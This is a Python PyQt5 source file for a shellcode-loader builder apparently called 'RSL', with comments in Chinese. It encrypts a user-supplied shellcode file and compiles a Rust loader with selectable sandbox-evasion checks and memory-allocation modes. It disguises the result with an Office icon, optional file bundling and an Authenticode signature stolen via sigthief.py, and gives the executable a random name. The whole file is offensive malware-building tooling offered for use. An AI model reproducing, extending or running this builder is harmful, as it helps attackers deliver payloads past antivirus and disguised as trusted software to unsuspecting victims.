import os
import sys
import subprocess
import random
import string
from PyQt5.QtCore import QSize, Qt, QThread, pyqtSignal
from PyQt5.QtWidgets import (
    QApplication, QWidget, QLineEdit, QPushButton, QTextEdit, QComboBox,
    QVBoxLayout, QHBoxLayout, QGroupBox, QMessageBox, QProgressBar, QCheckBox, QGridLayout
)
from PyQt5.QtGui import QIcon
import json
from .widgets import BinComboBox, IcoComboBox
from .sign import SignAppComboBox

def get_folder_icon():
    return QIcon(os.path.join('icons', 'folder.ico')) if os.path.exists(os.path.join('icons', 'folder.ico')) else QIcon()

def load_plugins_manifest():
    path = os.path.join('config', 'plugins.json')
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    enc = data.get('encryption') or []
    runm = data.get('run_modes') or []
    vmc = data.get('vm_checks') or []
    alloc_mem_modes = data.get('alloc_mem_modes') or []
    defaults = data.get('defaults') or {}
    if not enc or not runm:
        raise ValueError('plugins.json 缺少必要字段(encryption/run_modes)')
    return {
        'encryption': enc,
        'run_modes': runm,
        'vm_checks': vmc,
        'alloc_mem_modes': alloc_mem_modes,
        'defaults': defaults,
    }


class WorkerThread(QThread):
    log_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int)
    done_signal = pyqtSignal(str)
    error_signal = pyqtSignal(str)
    def __init__(self, parent, params):
        super().__init__(parent)
        self.params = params

    def run(self):
        import subprocess, os, sys, shutil
        try:
            self.progress_signal.emit(0)
            self.log_signal.emit('加密中...')
            self.progress_signal.emit(10)
            # 从配置映射到 encrypt.py 所需方法名
            manifest = load_plugins_manifest()
            enc_map = {e['id']: e.get('encrypt_arg', e['id']) for e in manifest['encryption']}
            enc_method_arg = enc_map.get(self.params['enc_method'], self.params['enc_method'])
            enc_cmd = [sys.executable, 'encrypt.py', '-i', self.params['input_bin'], '-o', 'src/encrypt.bin', '-m', enc_method_arg]
            result = subprocess.run(enc_cmd, capture_output=True, text=True, check=True)
            self.log_signal.emit(result.stdout)
            if result.stderr:
                self.log_signal.emit(result.stderr)
        except Exception as e:
            self.error_signal.emit(f'加密失败: {e}')
            return
        self.progress_signal.emit(40)
        try:
            self.log_signal.emit('Rust 构建中...')
            env = os.environ.copy()
            env['ICON_PATH'] = self.params['icon_path']
            env['RUN_MODE'] = self.params['run_mode']
            # 动态生成Cargo feature参数
            manifest = load_plugins_manifest()
            vm_map = {v['id']: v['feature'] for v in manifest['vm_checks']}
            selected = self.params.get('vm_checks', '').split(',') if self.params.get('vm_checks') else []
            features = [vm_map[t] for t in selected if t in vm_map]
            # 加密方式映射（从配置获取）
            enc_feature_map = {e['id']: e['feature'] for e in manifest['encryption']}
            enc_feature = enc_feature_map.get(self.params.get('enc_method', manifest['defaults'].get('encryption', 'chacha20-aes')), 'decrypt_chacha20_aes')
            features.append(enc_feature)
            # 运行模式映射
            run_map = {r['id']: r['feature'] for r in manifest['run_modes']}
            run_feature = run_map.get(self.params.get('run_mode', manifest['defaults'].get('run_mode', 'enum_ui')), 'run_enum_ui')
            features.append(run_feature)
            # 内存分配方式（feature 注入）
            mem_feature_map = {m['id']: m['feature'] for m in manifest.get('alloc_mem_modes', [])}
            mem_mode = self.params.get('mem_mode', manifest['defaults'].get('alloc_mem_mode', 'alloc_mem_va'))
            mem_feature = mem_feature_map.get(mem_mode, 'alloc_mem_va')
            features.append(mem_feature)

            # 资源伪造
            if self.params.get('forgery_enable'):
                features.append('with_forgery')
            features_str = ','.join(features)
            self.log_signal.emit(f'本次编译启用 features: {features_str}')
            build_cmd = ['cargo', 'build', '--release', '--no-default-features', f'--features={features_str}']
            result = subprocess.run(build_cmd, capture_output=True, text=True, check=True, env=env)
            self.log_signal.emit(result.stdout)
            if result.stderr:
                self.log_signal.emit(result.stderr)
        except Exception as e:
            self.error_signal.emit(f'Rust 构建失败: {e}')
            return
        self.progress_signal.emit(70)
        try:
            self.log_signal.emit('复制输出...')
            src_file = os.path.join('target', 'release', 'rsl.exe')
            out_dir = 'output'
            if not os.path.exists(out_dir):
                os.makedirs(out_dir)
            rand_name = __import__('random').choices(__import__('string').ascii_letters, k=6)
            rand_name = ''.join(rand_name) + '.exe'
            dst_file = os.path.join(out_dir, rand_name)
            if not os.path.exists(src_file):
                raise FileNotFoundError(src_file)
            shutil.copyfile(src_file, dst_file)
            self.log_signal.emit(f'已复制并重命名: {dst_file}')
        except Exception as e:
            self.error_signal.emit(f'输出文件复制失败: {e}')
            return
        # 签名
        if self.params['sign_enable']:
            app_path = self.params['sign_app']
            if not app_path:
                self.error_signal.emit('未选择被伪造应用的路径！')
                return
            sign_out_file = dst_file[:-4] + '_signed.exe'
            sign_cmd = [sys.executable, os.path.join('sign', 'sigthief.py'), '-i', app_path, '-t', dst_file, '-o', sign_out_file]
            try:
                result = subprocess.run(sign_cmd, capture_output=True, text=True, check=True)
                self.log_signal.emit(result.stdout)
                if result.stderr:
                    self.log_signal.emit(result.stderr)
                shutil.move(sign_out_file, dst_file)
                self.log_signal.emit(f'伪造签名完成: {dst_file}')
            except Exception as e:
                self.error_signal.emit(f'伪造签名失败: {e}')
                return
        self.progress_signal.emit(100)
        self.log_signal.emit('全部完成！')
        self.done_signal.emit(dst_file)
class LoaderGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('RSL')
        self.setMinimumWidth(650)
        self.setWindowIcon(QIcon(os.path.join('icons', 'icon.ico')))
        self.setStyleSheet(self.qss())
        self.init_ui()
    def log_append(self, text):
        self.log.append(text)
        self.log.ensureCursorVisible()

    def qss(self):
        return """
        QWidget {
            background: #f7f7f7;
            color: #222;
            font-family: 'Comic Sans MS', 'FZShuTi', 'Segoe Script', 'Segoe UI', 'Microsoft YaHei', Arial;
            font-size: 16px;
        }
        QGroupBox {
            border: 1px solid #bfc4cc;
            border-radius: 8px;
            margin-top: 10px;
            background: #ffffff;
            font-weight: bold;
            padding-top: 10px;
            font-family: 'Comic Sans MS', 'FZShuTi', 'Segoe Script', 'Segoe UI', 'Microsoft YaHei', Arial;
            font-size: 18px;
        }
        QGroupBox:title {
            subcontrol-origin: margin;
            left: 10px;
            padding: 0 3px 0 3px;
        }
        QLabel {
            color: #333;
            font-family: 'Comic Sans MS', 'FZShuTi', 'Segoe Script', 'Segoe UI', 'Microsoft YaHei', Arial;
        }
        QLineEdit, QComboBox, QTextEdit {
            background: #fff;
            border: 1px solid #bfc4cc;
            border-radius: 5px;
            color: #222;
            padding: 4px;
            font-family: 'Comic Sans MS', 'FZShuTi', 'Segoe Script', 'Segoe UI', 'Microsoft YaHei', Arial;
        }
        QPushButton {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #e3eaff, stop:1 #b3cfff);
            color: #222;
            border-radius: 6px;
            padding: 6px 18px;
            font-weight: bold;
            font-family: 'Comic Sans MS', 'FZShuTi', 'Segoe Script', 'Segoe UI', 'Microsoft YaHei', Arial;
        }
        QPushButton:hover {
            background: #d0e3ff;
        }
        QProgressBar {
            border: 1px solid #bfc4cc;
            border-radius: 6px;
            text-align: center;
            background: #fff;
            height: 18px;
        }
        QProgressBar::chunk {
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #b3cfff, stop:1 #a7e2d8);
            border-radius: 6px;
        }
        QTextEdit {
            font-family: 'Comic Sans MS', 'FZShuTi', 'Segoe Script', 'Consolas', 'Fira Mono', 'Microsoft YaHei';
            font-size: 15px;
            background: #f7f7f7;
            color: #333;
        }
        """

    def init_ui(self):
        layout = QVBoxLayout()
        layout.setSpacing(16)
        folder_icon = get_folder_icon()
        # 1. 输入bin（下拉+按钮）
        bin_group = QGroupBox('shellcode')
        bin_layout = QHBoxLayout()
        self.bin_box = BinComboBox()
        bin_btn = QPushButton(folder_icon, '')
        bin_btn.setToolTip('选择shellcode文件')
        bin_btn.setFixedWidth(32)
        bin_btn.clicked.connect(lambda: self.bin_box.choose_file(self))
        bin_layout.addWidget(self.bin_box)
        bin_layout.addWidget(bin_btn)
        bin_group.setLayout(bin_layout)
        layout.addWidget(bin_group)

        # 2. 加密方式
        enc_group = QGroupBox('🔒 加密方式')
        enc_layout = QHBoxLayout()
        self.enc_box = QComboBox()
        self.enc_box.setIconSize(QSize(20, 20))
        enc_icon = QIcon(os.path.join('icons', 'enc.ico')) if os.path.exists(os.path.join('icons', 'enc.ico')) else QIcon()
        # 从配置填充加密方式
        _manifest = load_plugins_manifest()
        for e in _manifest['encryption']:
            self.enc_box.addItem(enc_icon, e.get('label', e['id']), e['id'])
        # 默认项
        default_enc = _manifest['defaults'].get('encryption', None)
        if default_enc:
            for i in range(self.enc_box.count()):
                if self.enc_box.itemData(i) == default_enc:
                    self.enc_box.setCurrentIndex(i)
                    break
        enc_layout.addWidget(self.enc_box)
        enc_group.setLayout(enc_layout)
        layout.addWidget(enc_group)

        # 3. 图标选择（下拉+按钮）
        ico_group = QGroupBox('🖼️ 图标文件')
        ico_layout = QHBoxLayout()
        self.ico_box = IcoComboBox()
        ico_btn = QPushButton(folder_icon, '')
        ico_btn.setToolTip('选择图标文件')
        ico_btn.setFixedWidth(32)
        ico_btn.clicked.connect(lambda: self.ico_box.choose_file(self))
        ico_layout.addWidget(self.ico_box)
        ico_layout.addWidget(ico_btn)
        ico_group.setLayout(ico_layout)
        layout.addWidget(ico_group)

        # 4. 内存分配方式
        mem_group = QGroupBox('🧠 内存分配方式')
        mem_layout = QHBoxLayout()
        self.mem_mode_box = QComboBox()
        mem_icon = QIcon(os.path.join('icons', 'mem.ico')) if os.path.exists(os.path.join('icons', 'mem.ico')) else QIcon()
        mem_modes = _manifest.get('alloc_mem_modes', [])
        for m in mem_modes:
            self.mem_mode_box.addItem(mem_icon, m.get('label', m['id']), m['id'])
        default_mem = _manifest['defaults'].get('alloc_mem_mode', None)
        if default_mem:
            for i in range(self.mem_mode_box.count()):
                if self.mem_mode_box.itemData(i) == default_mem:
                    self.mem_mode_box.setCurrentIndex(i)
                    break
        mem_layout.addWidget(self.mem_mode_box)
        mem_group.setLayout(mem_layout)
        layout.addWidget(mem_group)

        # 5. VM检测（显示label，提交id）
        vm_group = QGroupBox('🛡️ Sandbox 检测')
        vm_layout = QVBoxLayout()
        _manifest2 = load_plugins_manifest()
        vm_items = _manifest2.get('vm_checks', [])
        # 回退：如果配置为空，用内置列表（label 与 id 相同）
        if not vm_items:
            vm_items = [{ 'id': t, 'label': t } for t in [
                'c_drive', 'desktop_files', 'tick', 'memory', 'api_flood',
                'mouse', 'common_software', 'uptime'
            ]]
        self.vm_checks_group = QGroupBox('')
        self.vm_checks_group.setVisible(True)
        grid = QGridLayout()
        self.vm_checkboxes = []
        for i, item in enumerate(vm_items):
            text = item.get('label', item.get('id', ''))
            vm_id = item.get('id', text)
            cb = QCheckBox(text)
            cb.setProperty('vm_id', vm_id)
            self.vm_checkboxes.append(cb)
            grid.addWidget(cb, i // 4, i % 4)
        self.vm_checks_group.setLayout(grid)
        vm_layout.addWidget(self.vm_checks_group)
        vm_group.setLayout(vm_layout)
        layout.addWidget(vm_group)

        # 6. 运行方式
        run_group = QGroupBox('🚀 运行方式')
        run_layout = QHBoxLayout()
        self.run_mode_box = QComboBox()
        self.run_mode_box.setIconSize(QSize(20, 20))
        run_icon = QIcon(os.path.join('icons', 'run.ico')) if os.path.exists(os.path.join('icons', 'run.ico')) else QIcon()
        run_modes = _manifest['run_modes']
        for rm in run_modes:
            self.run_mode_box.addItem(run_icon, rm.get('label', rm['id']), rm['id'])
        default_rm = _manifest['defaults'].get('run_mode', None)
        if default_rm:
            for i in range(self.run_mode_box.count()):
                if self.run_mode_box.itemData(i) == default_rm:
                    self.run_mode_box.setCurrentIndex(i)
                    break
        run_layout.addWidget(self.run_mode_box)
        run_group.setLayout(run_layout)
        layout.addWidget(run_group)

        # 7. 伪造签名
        sign_group = QGroupBox('🔏 伪造签名')
        sign_layout = QHBoxLayout()
        self.sign_app_box = SignAppComboBox()
        self.sign_choose_btn = QPushButton(folder_icon, '')
        self.sign_choose_btn.setToolTip('选择被伪造应用')
        self.sign_choose_btn.setFixedWidth(32)
        self.sign_choose_btn.clicked.connect(lambda: self.sign_app_box.choose_file(self))
        self.sign_enable_box = QCheckBox('启用签名')
        self.forgery_enable_box = QCheckBox('🎭 文件捆绑')
        sign_layout.addWidget(self.sign_app_box)
        sign_layout.addWidget(self.sign_choose_btn)
        sign_layout.addWidget(self.sign_enable_box)
        sign_layout.addWidget(self.forgery_enable_box)
        sign_layout.setStretch(0, 1)
        sign_layout.setStretch(1, 0)
        sign_layout.setStretch(2, 0)
        sign_layout.setStretch(3, 0)
        sign_group.setLayout(sign_layout)
        layout.addWidget(sign_group)

        # 8. 进度条
        self.progress = QProgressBar()
        self.progress.setValue(0)
        layout.addWidget(self.progress)

        # 9. 日志输出
        log_group = QGroupBox('📋 日志输出')
        log_layout = QVBoxLayout()
        self.log = QTextEdit()
        self.log.setReadOnly(True)
        log_layout.addWidget(self.log)
        log_group.setLayout(log_layout)
        layout.addWidget(log_group)

        # 10. 生成按钮
        self.gen_btn = QPushButton(QIcon(os.path.join('icons', 'rocket.ico')), '一键生成')
        self.gen_btn.setFixedHeight(38)
        self.gen_btn.clicked.connect(self.run_all)
        layout.addWidget(self.gen_btn, alignment=Qt.AlignHCenter)
        self.setLayout(layout)

    # 已无下拉框，无需切换
    def vm_custom_toggle(self, idx):
        pass

    def run_all(self):
        self.gen_btn.setEnabled(False)
        self.gen_btn.setText('生成中...')
        input_bin = self.bin_box.itemData(self.bin_box.currentIndex())
        if not input_bin:
            input_bin = 'calc.bin'
        # 直接从 itemData 读取 id
        run_mode = self.run_mode_box.itemData(self.run_mode_box.currentIndex()) or 'enum_ui'
        selected_ids = [cb.property('vm_id') for cb in self.vm_checkboxes if cb.isChecked()]
        selected_ids = [sid for sid in selected_ids if isinstance(sid, str) and sid]
        vm_checks = ','.join(selected_ids)
        enc_method = self.enc_box.itemData(self.enc_box.currentIndex()) or self.enc_box.currentText()
        icon_path = self.ico_box.itemData(self.ico_box.currentIndex())
        if not icon_path:
            icon_path = os.path.join('icons', 'app_icons', 'excel.ico')
        sign_enable = self.sign_enable_box.isChecked()
        sign_app = self.sign_app_box.itemData(self.sign_app_box.currentIndex())
        forgery_enable = self.forgery_enable_box.isChecked()

        mem_mode = self.mem_mode_box.itemData(self.mem_mode_box.currentIndex()) if hasattr(self, 'mem_mode_box') else None
        if not mem_mode:
            _manifest3 = load_plugins_manifest()
            mem_mode = _manifest3['defaults'].get('alloc_mem_mode', 'alloc_mem_va')
        params = dict(input_bin=input_bin, run_mode=run_mode, vm_checks=vm_checks, enc_method=enc_method, icon_path=icon_path, sign_enable=sign_enable, sign_app=sign_app, forgery_enable=forgery_enable, mem_mode=mem_mode)
        self.worker = WorkerThread(self, params)
        self.worker.log_signal.connect(self.log_append)
        self.worker.progress_signal.connect(self.progress.setValue)
        self.worker.done_signal.connect(self.on_gen_done)
        self.worker.error_signal.connect(self.on_gen_error)
        self.worker.start()
    def on_gen_error(self, msg):
        self.gen_btn.setEnabled(True)
        self.gen_btn.setText('一键生成')
        self.progress.setValue(0)
        self.log_append('[错误] ' + msg)
        QMessageBox.critical(self, '错误', msg)

    def on_gen_done(self, dst_file):
        self.progress.setValue(100)
        self.gen_btn.setEnabled(True)
        self.gen_btn.setText('一键生成')
        QMessageBox.information(self, '完成', f'生成成功: {dst_file}')
